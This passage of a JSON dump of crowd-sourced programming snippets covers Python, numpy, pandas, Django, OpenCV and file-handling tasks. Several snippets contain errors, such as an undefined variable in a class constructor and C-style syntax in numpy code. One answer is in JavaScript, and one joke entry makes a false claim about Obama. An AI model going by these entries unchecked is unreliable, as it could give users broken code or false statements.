    "link": null,
    "title": " number of database queries django",
    "description": "from django.conf import settings settings.DEBUG = True from django.db import connection, reset_queries   def num_queries(reset=True):     print(len(connection.queries))     if reset:         reset_queries() \n",
    "reg_date": "2021-10-12T11:31:50.000Z"
  },
  {
    "id": 2479,
    "keyword": null,
    "link": null,
    "title": " number of rows in dataframe pyspark",
    "description": "print((df.count(), len(df.columns)))\n",
    "reg_date": "2021-10-12T11:31:50.000Z"
  },
  {
    "id": 2480,
    "keyword": null,
    "link": null,
    "title": " number of rows or columns in numpy ndarray python",
    "description": "# get number of rows in 2D numpy array. numOfRows = np. size(arr2D, 0) # get number of columns in 2D numpy array. numOfColumns = np. size(arr2D, 1)\n",
    "reg_date": "2021-10-12T11:31:50.000Z"
  },
  {
    "id": 2481,
    "keyword": null,
    "link": null,
    "title": " number of times a value occurs in dataframne",
    "description": "df['a'].value_counts()\n",
    "reg_date": "2021-10-12T11:31:50.000Z"
  },
  {
    "id": 2482,
    "keyword": null,
    "link": null,
    "title": " number to list in python",
    "description": "# Declare a number a = 12345 #Number to list a_list = [int(x) for x in str(a)]\n",
    "reg_date": "2021-10-12T11:31:50.000Z"
  },
  {
    "id": 2483,
    "keyword": null,
    "link": null,
    "title": " numbers to words converter python program",
    "description": " # Number to Words  # Main Logic ones = ('Zero', 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', 'Nine')  twos = ('Ten', 'Eleven', 'Twelve', 'Thirteen', 'Fourteen', 'Fifteen', 'Sixteen', 'Seventeen', 'Eighteen', 'Nineteen')  tens = ('Twenty', 'Thirty', 'Forty', 'Fifty', 'Sixty', 'Seventy', 'Eighty', 'Ninety', 'Hundred')  suffixes = ('', 'Thousand', 'Million', 'Billion')  def process(number, index):          if number=='0':         return 'Zero'          length = len(number)          if(length > 3):         return False          number = number.zfill(3)     words = ''       hdigit = int(number[0])     tdigit = int(number[1])     odigit = int(number[2])          words += '' if number[0] == '0' else ones[hdigit]     words += ' Hundred ' if not words == '' else ''          if(tdigit > 1):         words += tens[tdigit - 2]         words += ' '         words += ones[odigit]          elif(tdigit == 1):         words += twos[(int(tdigit + odigit) % 10) - 1]              elif(tdigit == 0):         words += ones[odigit]      if(words.endswith('Zero')):         words = words[:-len('Zero')]     else:         words += ' '           if(not len(words) == 0):             words += suffixes[index]              return words;      def getWords(number):     length = len(str(number))          if length>12:         return 'This program supports upto 12 digit numbers.'          count = length // 3 if length % 3 == 0 else length // 3 + 1     copy = count     words = []       for i in range(length - 1, -1, -3):         words.append(process(str(number)[0 if i - 2 < 0 else i - 2 : i + 1], copy - count))         count -= 1;      final_words = ''     for s in reversed(words):         temp = s + ' '         final_words += temp          return final_words # End Main Logic  # Reading number from user number = int(input('Enter any number: ')) print('%d in words is: %s' %(number, getWords(number))) \n",
    "reg_date": "2021-10-12T11:31:50.000Z"
  },
  {
    "id": 2484,
    "keyword": null,
    "link": null,
    "title": " numpy array count frequency",
    "description": "import numpy as np  x = np.array([1,1,1,2,2,2,5,25,1,1]) unique, counts = np.unique(x, return_counts=True)  print np.asarray((unique, counts)).T\n",
    "reg_date": "2021-10-12T11:31:50.000Z"
  },
  {
    "id": 2485,
    "keyword": null,
    "link": null,
    "title": " numpy array heaviside float values to 0 or 1",
    "description": "                      0   if x1 < 0 heaviside(x1, x2) =  x2   if x1 == 0                       1   if x1 > 0 \n",
    "reg_date": "2021-10-12T11:31:50.000Z"
  },
  {
    "id": 2486,
    "keyword": null,
    "link": null,
    "title": " numpy array remove scientific notation",
    "description": "np.set_printoptions(suppress=True)\n",
    "reg_date": "2021-10-12T11:31:50.000Z"
  },
  {
    "id": 2487,
    "keyword": null,
    "link": null,
    "title": " numpy compare arrays",
    "description": "bool isEqual = numpy.array_equal(Array1, Array2)\n(A==B).all()\n# np.array_equal checks whether two arrays have the same # shape and all elements values\n",
    "reg_date": "2021-10-12T11:31:50.000Z"
  },
  {
    "id": 2488,
    "keyword": null,
    "link": null,
    "title": " numpy count the number of 1s in array",
    "description": "a = numpy.array([0, 3, 0, 1, 0, 1, 2, 1, 0, 0, 0, 0, 1, 3, 4]) unique, counts = numpy.unique(a, return_counts=True) dict(zip(unique, counts)) {0: 7, 1: 4, 2: 1, 3: 2, 4: 1}\nprint(np.sum(a % 2 == 1))\n",
    "reg_date": "2021-10-12T11:31:51.000Z"
  },
  {
    "id": 2489,
    "keyword": null,
    "link": null,
    "title": " numpy determinant python matrix",
    "description": "numpy.linalg.det(array)\n",
    "reg_date": "2021-10-12T11:31:51.000Z"
  },
  {
    "id": 2490,
    "keyword": null,
    "link": null,
    "title": " numpy empty array",
    "description": "import numpy as np  n = 2 X = np.empty(shape=[0, n])  for i in range(5):     for j  in range(2):         X = np.append(X, [[i, j]], axis=0)  print X \nnumpy.empty(shape, dtype=float, order='C')\n>>> np.empty([2, 2]) array([[ -9.74499359e+001,   6.69583040e-309],        [  2.13182611e-314,   3.06959433e-309]])         #uninitialized \n>>> np.empty([2, 2]) #Output: array([[ -9.74499359e+001,   6.69583040e-309],        [  2.13182611e-314,   3.06959433e-309]])          \n    a = []     for x in y:         a.append(x)     a = np.array(a)\n",
    "reg_date": "2021-10-12T11:31:51.000Z"
  },
  {
    "id": 2491,
    "keyword": null,
    "link": null,
    "title": " numpy factorial",
    "description": "a = np.math.factorial(n)\n// METHOD ONE const factorialNumber = num => {     let factorials = []     for(let i = 1; i <= num; i++) factorials.push(i)     return factorials.reduce((acc , curr) => acc * curr, 1) }  // METHOD TWO const factorialNumber = num => {     let factorial = 1, i = 1     while(i <= num){ factorial *= i; i++ }     return factorial } // METHOD THREE function factorialNumber(num) {     if(num < 1) return 1     else return factorialNumber(num - 1) * num }\n",
    "reg_date": "2021-10-12T11:31:51.000Z"
  },
  {
    "id": 2492,
    "keyword": null,
    "link": null,
    "title": " numpy fill na with 0",
    "description": "import numpy as np  A[np.isnan(A)] = 0\n",
    "reg_date": "2021-10-12T11:31:51.000Z"
  },
  {
    "id": 2493,
    "keyword": null,
    "link": null,
    "title": " numpy find rows containing nan",
    "description": "# in each case returns array of bool np.isnan(a).any(axis=1) # rows where any value is nan np.isnan(a).all(axis=1) # rows where all values are nan\n",
    "reg_date": "2021-10-12T11:31:51.000Z"
  },
  {
    "id": 2494,
    "keyword": null,
    "link": null,
    "title": " numpy from csv",
    "description": "from numpy import genfromtxt my_data = genfromtxt('my_file.csv', delimiter=',') \nimport numpy as np x = np.arange(0.0,5.0,1.0) np.savetxt('test.csv', x, delimiter=',') \n",
    "reg_date": "2021-10-12T11:31:51.000Z"
  },
  {
    "id": 2495,
    "keyword": null,
    "link": null,
    "title": " numpy identity matrix",
    "description": ">>> np.identity(3) array([[1.,  0.,  0.],        [0.,  1.,  0.],        [0.,  0.,  1.]]) \n>>> np.eye(3) array([[1.,  0.,  0.],        [0.,  1.,  0.],        [0.,  0.,  1.]])\n",
    "reg_date": "2021-10-12T11:31:51.000Z"
  },
  {
    "id": 2496,
    "keyword": null,
    "link": null,
    "title": " numpy list to array",
    "description": "import numpy as np my_list = [2,4,6,8,10] my_array = np.array(my_list) # printing my_array print my_array # printing the type of my_array print type(my_array)\n# importing library  import numpy      # initilizing list  lst = [1, 7, 0, 6, 2, 5, 6]     # converting list to array  arr = numpy.array(lst)     # displaying list  print (\"List: \", lst)     # displaying array  print (\"Array: \", arr) \n# Basic syntax: numpy_array.tolist()  # Example usage: your_array = np.array([[1, 2, 3], [4, 5, 6]]) your_array --> array([[1, 2, 3],            [4, 5, 6]])  your_array.tolist() --> [[1, 2, 3], [4, 5, 6]]\n>>> a = [1, 2] >>> np.asarray(a) array([1, 2]) \nimport numpy as np npa = np.asarray(Lists, dtype=np.float32)\nimport numpy as np  # 1d array to list arr = np.array([1, 2, 3]) print(f'NumPy Array:\\n{arr}') #NumPy Array: [1 2 3]  list1 = arr.tolist() print(f'List: {list1}') #List: [1, 2, 3]\n",
    "reg_date": "2021-10-12T11:31:51.000Z"
  },
  {
    "id": 2497,
    "keyword": null,
    "link": null,
    "title": " numpy matrix",
    "description": ">>> np.array([[1, 2], [3, 4]]) array([[1, 2],        [3, 4]]) #np.matrix is no longer recommended!\nnp.matrix([[1, 2], [3, 4]])  # matrix([[1, 2], #         [3, 4]]) \n>>> import numpy as np >>> a = np.array([2,3,4]) >>> a array([2, 3, 4]) >>> a.dtype dtype('int64') >>> b = np.array([1.2, 3.5, 5.1]) >>> b.dtype dtype('float64') \n",
    "reg_date": "2021-10-12T11:31:51.000Z"
  },
  {
    "id": 2498,
    "keyword": null,
    "link": null,
    "title": " numpy merge arrays",
    "description": ">>> a = np.array([[1, 2], [3, 4]]) >>> b = np.array([[5, 6]]) >>> np.concatenate((a, b), axis=0) array([[1, 2],        [3, 4],        [5, 6]]) >>> np.concatenate((a, b.T), axis=1) array([[1, 2, 5],        [3, 4, 6]]) \nnumpy.concatenate([arr1, arr2]) # Joining arr1 and arr2\n# concatenate 2 numpy arrays: row-wise >np.concatenate((array2D_1, array2D_2))   array([[ 0,  1,  2],        [ 3,  4,  5],        [ 6,  7,  8],        [10, 11, 12],        [13, 14, 15],        [16, 17, 18]]) \n",
    "reg_date": "2021-10-12T11:31:52.000Z"
  },
  {
    "id": 2499,
    "keyword": null,
    "link": null,
    "title": " numpy normal distribution",
    "description": ">>> mu, sigma = 0, 0.1 # mean and standard deviation >>> s = np.random.normal(mu, sigma, 1000) \ndef normalize(v):     norm = np.linalg.norm(v)     if norm == 0:         return v     return v / norm \n",
    "reg_date": "2021-10-12T11:31:52.000Z"
  },
  {
    "id": 2500,
    "keyword": null,
    "link": null,
    "title": " numpy print full array",
    "description": "import sys import numpy numpy.set_printoptions(threshold=sys.maxsize) \nwith numpy.printoptions(threshold=numpy.inf):     print(arr)\n",
    "reg_date": "2021-10-12T11:31:52.000Z"
  },
  {
    "id": 2501,
    "keyword": null,
    "link": null,
    "title": " numpy random float array between 0 and 1",
    "description": "# Returns an array of floats between 0 and 10 of size 15 np.random.uniform(low=0, high=10, size=15)\n",
    "reg_date": "2021-10-12T11:31:52.000Z"
  },
  {
    "id": 2502,
    "keyword": null,
    "link": null,
    "title": " numpy random int",
    "description": "np.random.randint(2, size=10) # Creates binary sample of size 10 np.random.randint(5, size=10) # Creates sample with 0-4 as values of size 10  np.random.randint(5, size=(2, 4))\nimport numpy as np  randi_arr = np.random.randint(start, end, dimensions) #random integers will be sampled from [start, end) (end not inclusive) #end is optional; if end is not specified, random integers will be sampled from [0, start) (start not inclusive) #dimensions can be specified as shown here; (m,n) #2D array with size 'm x n'\n>>> np.random.randint(2, size=10) array([1, 0, 0, 0, 1, 1, 0, 0, 1, 0]) # random >>> np.random.randint(1, size=10) array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0])\nfrom numpy import random  x = random.randint(100)  print(x)\n",
    "reg_date": "2021-10-12T11:31:52.000Z"
  },
  {
    "id": 2503,
    "keyword": null,
    "link": null,
    "title": " numpy remove element",
    "description": "numpy.delete(array, index)\nnumpy.delete(a, index)\n",
    "reg_date": "2021-10-12T11:31:52.000Z"
  },
  {
    "id": 2504,
    "keyword": null,
    "link": null,
    "title": " numpy round",
    "description": "x = np.round(x, decimals = 4)\ndf.round(n) # for n number after the ,\n",
    "reg_date": "2021-10-12T11:31:52.000Z"
  },
  {
    "id": 2505,
    "keyword": null,
    "link": null,
    "title": " numpy series reset index",
    "description": ">>> s.reset_index(inplace=True, drop=True) >>> s 0    1 1    2 2    3 3    4 Name: foo, dtype: int64 \n",
    "reg_date": "2021-10-12T11:31:52.000Z"
  },
  {
    "id": 2506,
    "keyword": null,
    "link": null,
    "title": " numpy standard deviation",
    "description": "# Calculate standard deviaton based on population/sample import numpy as np values = [1,5,4,3,3,4] # as default, std() calculates basesd on a population # by specifying ddof=1, it calculates based on the sample np.std(values)\t\t\t\t# ==1.247219128924647 np.std(values ,ddof=1)\t\t# ==1.3662601021279464\nimport numpy as np data = [68,86,36,57,24,46,32,53] #define some data data_std = np.std(data) #outputs 19.00493356999703\nimport numpy numbers = [1,5,6,7,9,11,13] standard = numpy.std(numbers) #Calculates standard deviation print(standard)\nimport numpy as np values=[1,10,100] print(np.std(values)) values=[1,10,100,np.nan] print(np.nanstd(values))\na = [1,2,3,4,5] numpy.std(a) # will give the standard deviation of a\n",
    "reg_date": "2021-10-12T11:31:52.000Z"
  },
  {
    "id": 2507,
    "keyword": null,
    "link": null,
    "title": " numpy stdev",
    "description": "# Calculate standard deviaton based on population/sample import numpy as np values = [1,5,4,3,3,4] # as default, std() calculates basesd on a population # by specifying ddof=1, it calculates based on the sample np.std(values)\t\t\t\t# ==1.247219128924647 np.std(values ,ddof=1)\t\t# ==1.3662601021279464\nimport numpy as np data = [68,86,36,57,24,46,32,53] #define some data data_std = np.std(data) #outputs 19.00493356999703\nimport numpy as np values=[1,10,100] print(np.std(values)) values=[1,10,100,np.nan] print(np.nanstd(values))\n",
    "reg_date": "2021-10-12T11:31:52.000Z"
  },
  {
    "id": 2508,
    "keyword": null,
    "link": null,
    "title": " numpy take out elements equal to zero",
    "description": "a[a != 0]\n",
    "reg_date": "2021-10-12T11:31:53.000Z"
  },
  {
    "id": 2509,
    "keyword": null,
    "link": null,
    "title": " numpy to csv",
    "description": "from numpy import genfromtxt my_data = genfromtxt('my_file.csv', delimiter=',') \nimport pandas as pd  pd.DataFrame(np_array).to_csv(\"path/to/file.csv\")\nimport numpy as np x = np.arange(0.0,5.0,1.0) np.savetxt('test.csv', x, delimiter=',') \n",
    "reg_date": "2021-10-12T11:31:53.000Z"
  },
  {
    "id": 2510,
    "keyword": null,
    "link": null,
    "title": " obama",
    "description": "hes so cool\nObamas first name is president :)\n",
    "reg_date": "2021-10-12T11:31:53.000Z"
  },
  {
    "id": 2511,
    "keyword": null,
    "link": null,
    "title": " object.image.url email template django",
    "description": "SERVER_URL=\"https://your-domain.com\" # You could use django-environ to load this from environment variables also to be flexible when switching between environments\n",
    "reg_date": "2021-10-12T11:31:53.000Z"
  },
  {
    "id": 2512,
    "keyword": null,
    "link": null,
    "title": " object literal python",
    "description": "class litral:   def __init__(self, **kwargs):     self.__dict__.update(args)\n",
    "reg_date": "2021-10-12T11:31:53.000Z"
  },
  {
    "id": 2513,
    "keyword": null,
    "link": null,
    "title": " object to int64 pandas",
    "description": ">>> df['purchase'].astype(str).astype(int) \n# convert Series my_series = pd.to_numeric(my_series)  # convert column \"a\" of a DataFrame df[\"a\"] = pd.to_numeric(df[\"a\"]) \ndf.astype(int)\n",
    "reg_date": "2021-10-12T11:31:53.000Z"
  },
  {
    "id": 2514,
    "keyword": null,
    "link": null,
    "title": " octal in python",
    "description": "# Python program to convert decimal into other number systems dec = 344  print(\"The decimal value of\", dec, \"is:\") print(bin(dec), \"in binary.\") print(oct(dec), \"in octal.\") print(hex(dec), \"in hexadecimal.\") \ndec =13 print(bin(dec),oct(dec),hex(dec))\t\t#prints decimal,octal,hexadecimal value of 13\n",
    "reg_date": "2021-10-12T11:31:53.000Z"
  },
  {
    "id": 2515,
    "keyword": null,
    "link": null,
    "title": " odd or even python",
    "description": "# Python program to check if the input number is odd or even. # A number is even if division by 2 gives a remainder of 0. # If the remainder is 1, it is an odd number.  num = int(input(\"Enter a number: \")) if (num % 2) == 0:    print(\"{0} is Even\".format(num)) else:    print(\"{0} is Odd\".format(num))\nm = int(input(\"Enter number\")) if m % 2 == 0:     print(m,\"is an even number\") else:     print(m,\"is an odd number\")      \nnum = int(input(\"Enter a number: \"))   if (num % 2) == 0:      print(\"{0} is Even number\".format(num))   else:      print(\"{0} is Odd number\".format(num))  \nnumber = int(input(\"Write a number:- \")) if number%2 == 0:     print(\"Even number\") else:     print(\"odd number\")\nn = int(input(\"Enter a number: \")) print(n,\"is Even.\") if (n % 2) == 0 else print(n,\"is Odd.\")\nnum = int(input(\"Enter a number: \")) if (num % 2) == 0:    print(\"{0} is Even\".format(num)) else:    print(\"{0} is Odd\".format(num))\n",
    "reg_date": "2021-10-12T11:31:54.000Z"
  },
  {
    "id": 2516,
    "keyword": null,
    "link": null,
    "title": " on member leave event in discord.py",
    "description": "@client.event async def on_member_leave(member):     print(\"member has left a server.\")\n",
    "reg_date": "2021-10-12T11:31:54.000Z"
  },
  {
    "id": 2517,
    "keyword": null,
    "link": null,
    "title": " online pygame compiler with sprites",
    "description": "import pygame background_colour = (255,255,255) (width, height) = (300, 200) screen = pygame.display.set_mode((width, height)) pygame.display.set_caption('Tutorial 1') screen.fill(background_colour) pygame.display.flip() running = True while running:   for event in pygame.event.get():     if event.type == pygame.QUIT:       running = False\nimport pygame pygame.init() dis=pygame.display.set_mode((400,300))   pygame.display.set_caption('Snake game by Pythonist')   blue=(0,0,255) red=(255,0,0)   game_over=False while not game_over:     for event in pygame.event.get():         if event.type==pygame.QUIT:             game_over=True     pygame.draw.rect(dis,blue,[200,150,10,10])     pygame.display.update() pygame.quit() quit()\n",
    "reg_date": "2021-10-12T11:31:54.000Z"
  },
  {
    "id": 2518,
    "keyword": null,
    "link": null,
    "title": " only keep few key value from dict",
    "description": ">>> dict_filter = lambda x, y: dict([ (i,x[i]) for i in x if i in set(y) ]) >>> large_dict = {\"a\":1,\"b\":2,\"c\":3,\"d\":4} >>> new_dict_keys = (\"c\",\"d\") >>> small_dict=dict_filter(large_dict, new_dict_keys) >>> print(small_dict) {'c': 3, 'd': 4} >>> \n",
    "reg_date": "2021-10-12T11:31:54.000Z"
  },
  {
    "id": 2519,
    "keyword": null,
    "link": null,
    "title": " only keep rows of a dataframe based on a column value",
    "description": "df.loc[df['column_name'] == some_value]\ndf.loc[(df['column_name'] >= A) & (df['column_name'] <= B)]\n",
    "reg_date": "2021-10-12T11:31:54.000Z"
  },
  {
    "id": 2520,
    "keyword": null,
    "link": null,
    "title": " open a filename starting with in python",
    "description": "for file in os.listdir(\"/Users/darren/Desktop/test\"):     if file.startswith(\"art\"):         print(file)\n",
    "reg_date": "2021-10-12T11:31:55.000Z"
  },
  {
    "id": 2521,
    "keyword": null,
    "link": null,
    "title": " open a web page using selenium python",
    "description": "from selenium import webdriver from selenium.webdriver.common.keys import Keys  driver = webdriver.Chrome('./chromedriver') driver.get(\"https://www.python.org\") print(driver.title) search_bar = driver.find_element_by_name(\"q\") search_bar.clear() search_bar.send_keys(\"getting started with python\") search_bar.send_keys(Keys.RETURN) print(driver.current_url) driver.close()\n",
    "reg_date": "2021-10-12T11:31:55.000Z"
  },
  {
    "id": 2522,
    "keyword": null,
    "link": null,
    "title": " open applications by python",
    "description": "dir = 'C:\\\\myprogram.exe'  import os os.startfile(dir) os.system(dir)  import subprocess subprocess.Popen([dir]) subprocess.call(dir)\n",
    "reg_date": "2021-10-12T11:31:55.000Z"
  },
  {
    "id": 2523,
    "keyword": null,
    "link": null,
    "title": " open choose files from file explorer python",
    "description": "import tkinter as tk from tkinter import filedialog  root = tk.Tk() root.withdraw()  files = filedialog.askopenfilenames()\nimport sys path = r'C:\\Program Files (x86)\\IronPython 2.7\\Lib' sys.path.append(path)  import subprocess subprocess.Popen('explorer \"C:\\temp\"')\n",
    "reg_date": "2021-10-12T11:31:55.000Z"
  },
  {
    "id": 2524,
    "keyword": null,
    "link": null,
    "title": " open firefox python",
    "description": "import webbrowser webbrowser.get('firefox').open_new_tab('http://www.google.com') webbrowser.open('http://www.google.com') \n",
    "reg_date": "2021-10-12T11:31:55.000Z"
  },
  {
    "id": 2525,
    "keyword": null,
    "link": null,
    "title": " open image from link python",
    "description": "from PIL import Image import requests from io import BytesIO  response = requests.get(url) img = Image.open(BytesIO(response.content))\n",
    "reg_date": "2021-10-12T11:31:55.000Z"
  },
  {
    "id": 2526,
    "keyword": null,
    "link": null,
    "title": " open image in numpy",
    "description": "image = PIL.Image.open(pathToImage) frame = numpy.asarray(image)\n",
    "reg_date": "2021-10-12T11:31:55.000Z"
  },
  {
    "id": 2527,
    "keyword": null,
    "link": null,
    "title": " open mat file in python",
    "description": "import scipy.io mat = scipy.io.loadmat('file.mat')\n#!python #!/usr/bin/env python from scipy.io import loadmat x = loadmat('test.mat') lon = x['lon'] lat = x['lat'] # one-liner to read a single variable lon = loadmat('test.mat')['lon'] \nfrom mat4py import loadmat  data = loadmat('datafile.mat')\n",
    "reg_date": "2021-10-12T11:31:56.000Z"
  },
  {
    "id": 2528,
    "keyword": null,
    "link": null,
    "title": " open text file in python",
    "description": "with open (\"data.txt\", \"r\") as myfile:     data = myfile.read().splitlines() \nfile = open(&ldquo;testfile.txt&rdquo;,&rdquo;w&rdquo;)    file.write(&ldquo;Hello World&rdquo;)  file.write(&ldquo;This is our new text file&rdquo;)  file.write(&ldquo;and this is another line.&rdquo;)  file.write(&ldquo;Why? Because we can.&rdquo;)    file.close() \nfile = '/home/text/chapter001.txt' f=open(file,'r') data = f.read() print('data =',data)\nf=open(\"Diabetes.txt\",'r') f.read()\nf = open(\"welcome.txt\", \"r\") print(f.read())  f.close()\nfin = open(\"NAME.txt\", 'r') body = fin.read().split(\"\\n\") line = fin.readline().strip()\n",
    "reg_date": "2021-10-12T11:31:56.000Z"
  },
  {
    "id": 2529,
    "keyword": null,
    "link": null,
    "title": " open tiff image pyt",
    "description": ">>> from PIL import Image >>> im = Image.open('a_image.tif') >>> im.show()\n",
    "reg_date": "2021-10-12T11:31:56.000Z"
  },
  {
    "id": 2530,
    "keyword": null,
    "link": null,
    "title": " openai gym conda",
    "description": "conda install -c conda-forge gym\n",
    "reg_date": "2021-10-12T11:31:56.000Z"
  },
  {
    "id": 2531,
    "keyword": null,
    "link": null,
    "title": " opencv convert to black and white",
    "description": "import cv2    originalImage = cv2.imread('C:/Users/N/Desktop/Test.jpg') grayImage = cv2.cvtColor(originalImage, cv2.COLOR_BGR2GRAY)    (thresh, blackAndWhiteImage) = cv2.threshold(grayImage, 127, 255, cv2.THRESH_BINARY)   cv2.imshow('Black white image', blackAndWhiteImage) cv2.imshow('Original image',originalImage) cv2.imshow('Gray image', grayImage)    cv2.waitKey(0) cv2.destroyAllWindows() \nimport cv2  originalImage = cv2.imread(\"PATH/TO/IMG\") grayImage = cv2.cvtColor(originalImage, cv2.COLOR_BGR2GRAY)\n",
    "reg_date": "2021-10-12T11:31:56.000Z"
  },
  {
    "id": 2532,
    "keyword": null,
    "link": null,
    "title": " opencv get image size",
    "description": "img = cv2.imread('myImage.jpg') height, width, channels = img.shape \n",
    "reg_date": "2021-10-12T11:31:56.000Z"
  },
  {
    "id": 2533,
    "keyword": null,
    "link": null,
    "title": " opencv grayscale to rgb",
    "description": "backtorgb = cv2.cvtColor(gray,cv2.COLOR_GRAY2RGB)\nimport cv2  # Reading color image as grayscale gray = cv2.imread(\"color-img.png\",0)  # Showing grayscale image cv2.imshow(\"Grayscale Image\", gray)  # waiting for key event cv2.waitKey(0)  # destroying all windows cv2.destroyAllWindows()\ncv::transform(white_balance_image, i_test_base, cv::Matx13f(0.114, 0.587, 0.299)); \n",
    "reg_date": "2021-10-12T11:31:56.000Z"
  },
  {
    "id": 2534,
    "keyword": null,
    "link": null,
    "title": " opencv show image jupyter",
    "description": "# matplotlib interprets images in RGB format, but OpenCV uses BGR format  # so to convert the image so that it's properly loaded, convert it before loading  img = cv2.imread('filename.ext')\t\t# this is read in BGR format rgb_img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\t\t# this converts it into RGB  plt.imshow(rgb_img) plt.show() \n# linkedin.com/in/barisx from matplotlib import pyplot as plt import cv2  img = cv2.imread('/Users/barisx/test.jpg') gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)  plt.imshow(gray) plt.title('my picture') plt.show()\n",
    "reg_date": "2021-10-12T11:31:57.000Z"
  },
  {
    "id": 2535,
    "keyword": null,
    "link": null,
    "title": " opencv tkinter image",
    "description": "import tkinter import cv2 import PIL.Image, PIL.ImageTk  # Create a window window = tkinter.Tk() window.title(\"OpenCV and Tkinter\")  # Load an image using OpenCV cv_img = cv2.cvtColor(cv2.imread(\"background.jpg\"), cv2.COLOR_BGR2RGB)  # Get the image dimensions (OpenCV stores image data as NumPy ndarray) height, width, no_channels = cv_img.shape  # Create a canvas that can fit the above image canvas = tkinter.Canvas(window, width = width, height = height) canvas.pack()  # Use PIL (Pillow) to convert the NumPy ndarray to a PhotoImage photo = PIL.ImageTk.PhotoImage(image = PIL.Image.fromarray(cv_img))  # Add a PhotoImage to the Canvas canvas.create_image(0, 0, image=photo, anchor=tkinter.NW)  # Run the window loop window.mainloop()\n",
    "reg_date": "2021-10-12T11:31:57.000Z"
  },
  {
    "id": 2536,
    "keyword": null,
    "link": null,
    "title": " openpyxl new workbook",
    "description": ">>> from openpyxl import Workbook >>> from openpyxl.utils import get_column_letter >>> >>> wb = Workbook() >>> >>> dest_filename = 'empty_book.xlsx' >>> >>> ws1 = wb.active >>> ws1.title = \"range names\" >>> >>> for row in range(1, 40): ...     ws1.append(range(600)) >>> >>> ws2 = wb.create_sheet(title=\"Pi\") >>> >>> ws2['F5'] = 3.14 >>> >>> ws3 = wb.create_sheet(title=\"Data\") >>> for row in range(10, 20): ...     for col in range(27, 54): ...         _ = ws3.cell(column=col, row=row, value=\"{0}\".format(get_column_letter(col))) >>> print(ws3['AA10'].value) AA >>> wb.save(filename = dest_filename) \n",
    "reg_date": "2021-10-12T11:31:57.000Z"
  },
  {
    "id": 2537,
    "keyword": null,
    "link": null,
    "title": " oppsite of abs() python",
    "description": "-ABS(x) \n",
    "reg_date": "2021-10-12T11:31:57.000Z"
  },
  {
    "id": 2538,
    "keyword": null,
    "link": null,
    "title": " or condition in pandas",
    "description": "df2 = df[(df.a != -1) | (df.b != -1)]\ndf1 = df[(df.a != -1) & (df.b != -1)]\n",
    "reg_date": "2021-10-12T11:31:57.000Z"
  },
  {
    "id": 2539,
    "keyword": null,
    "link": null,
    "title": " order by listview django",
    "description": "class Reviews(ListView):     model = ProductReview     paginate_by = 50     template_name = 'review_system/reviews.html' \t#add ordering: the least before the attribute means decreasing order     ordering = ['-date_created']\n",
    "reg_date": "2021-10-12T11:31:57.000Z"
  },
  {
    "id": 2540,
    "keyword": null,
    "link": null,
    "title": " order dataframe by multiple columns python",
    "description": "df.sort_values(['a', 'b'], ascending=[True, False])\ndf = df.sort_values([\"b\", \"c\"], ascending = (False, True))\n",
    "reg_date": "2021-10-12T11:31:57.000Z"
  },
  {
    "id": 2541,
    "keyword": null,
    "link": null,
    "title": " order pandas dataframe by column values",
    "description": "df.sort_values(by='col1', ascending=False)\n>>> df.sort_values(by=['col1'])     col1 col2 col3 0   A    2    0 1   A    1    1 2   B    9    9 5   C    4    3 4   D    7    2 3   NaN  8    4 \nsorted = df.sort_values('column-to-sort-on', ascending=False) #or df.sort_values('name', inplace=True) \n",
    "reg_date": "2021-10-12T11:31:57.000Z"
  },
  {
    "id": 2542,
    "keyword": null,
    "link": null,
    "title": " os.execl(sys.executable, sys.executable, *sys.argv)",
    "description": "import os import sys  restart = input(\"\\nDo you want to restart the program? [y/n] > \")  if restart == \"y\":     os.execl(sys.executable, os.path.abspath(__file__), *sys.argv)  else:     print(\"\\nThe program will be closed...\")     sys.exit(0) \n",
    "reg_date": "2021-10-12T11:31:58.000Z"
  },
  {
    "id": 2543,
    "keyword": null,
    "link": null,
    "title": " os.listdir in python",
    "description": "#import libs import os  #set path of file or website on which listdir is to be applied path='/users/desktop/dummy'  #Print all data in path  for file in os.listdir(path):   print(file)\nos.chdir(\"directory name\")\nfrom os import listdir  ## Prints the current directory as a list (including file types) print(os.listdir()) \n",
    "reg_date": "2021-10-12T11:31:58.000Z"
  },
  {
    "id": 2544,
    "keyword": null,
    "link": null,
    "title": " os get current directory",
    "description": "import os  print(os.getcwd())\nimport os  dir_path = os.path.dirname(os.path.realpath(__file__))\nimport os os.getcwd() \nimport os  #Get Current working Directory currentDirectory = os.getcwd()  #Change the Current working Directory os.chdir('/home/varun') \nimport os current_working_directory = os.getcwd() print(current_working_directory) # should print the cwd  \"\"\" Bonus: If you want to change cwd, without moving file, use the following method\"\"\" os.chdir(\"path/to/directory\")\nimport os  dir_path = os.path.dirname(os.path.realpath(__file__)) \n",
    "reg_date": "2021-10-12T11:31:58.000Z"
  },
  {
    "id": 2545,
    "keyword": null,
    "link": null,
    "title": " os remove entire folder python",
    "description": "import os import shutil  os.remove('/your/path/to/file.txt') #removes a file.  os.rmdir('/your/folder/path/') #removes an empty directory.  shutil.rmtree('/your/folder/path/') #deletes a directory and all its contents.\n",
    "reg_date": "2021-10-12T11:31:58.000Z"
  },
  {
    "id": 2546,
    "keyword": null,
    "link": null,
    "title": " os walk example",
    "description": "import os folder_path = r'C:\\Test' for root,dirs,files in os.walk(folder_path, topdown=True):   print(root)   print(dirs)   print(files)\n# !/usr/bin/python  import os for root, dirs, files in os.walk(\".\", topdown=False):    for name in files:       print(os.path.join(root, name))    for name in dirs:       print(os.path.join(root, name))\n",
    "reg_date": "2021-10-12T11:31:58.000Z"
  },
  {
    "id": 2547,
    "keyword": null,
    "link": null,
    "title": " override python print for class",
    "description": ">>> class Test: ...     def __repr__(self): ...         return \"Test()\" ...     def __str__(self): ...         return \"member of Test\" ...  >>> t = Test() >>> t Test() >>> print(t) member of Test\n",
    "reg_date": "2021-10-12T11:31:58.000Z"
  },
  {
    "id": 2548,
    "keyword": null,
    "link": null,
    "title": " oython get time",
    "description": " from datetime import datetime  now = datetime.now()  current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time) \n",
    "reg_date": "2021-10-12T11:31:58.000Z"
  },
  {
    "id": 2549,
    "keyword": null,
    "link": null,
    "title": " pad zeros to a string python",
    "description": "my_str='9' my_str.zfill(2)\nf_num.strip().zfill(2)\n",
    "reg_date": "2021-10-12T11:31:58.000Z"
  },
  {
    "id": 2550,
    "keyword": null,
